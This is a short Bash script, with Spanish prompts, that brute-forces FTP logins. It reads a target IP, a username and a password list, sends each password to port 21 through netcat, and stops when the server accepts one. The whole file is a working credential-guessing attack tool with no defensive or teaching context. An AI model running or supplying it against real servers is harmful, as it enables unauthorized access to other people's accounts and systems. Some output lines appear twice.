#!/bin/bash

read -p "Introduce la IP del servidor FTP objetivo: " ftp_server
read -p "Introuce el usuario para acceder vía FTP: " ftp_user
read -p "Introduce el nombre del fichero de texto donde tengas las contraseñas: " password_file

passwords=$(cat "$password_file")

for password in $passwords; do
  echo "Intentando contraseña: $password"
  output=$(echo -e "USER $ftp_user\r\nPASS $password\r\nQUIT\r\n" | nc -w 2 "$ftp_server" "21")

  if echo "$output" | grep -q "230"; then
    echo "Contraseña correcta: $password"
    echo "Contraseña correcta: $password"
    exit 0
  fi
done

echo "No se encontró una contraseña válida"
echo "No se encontró una contraseña válida"
exit 1
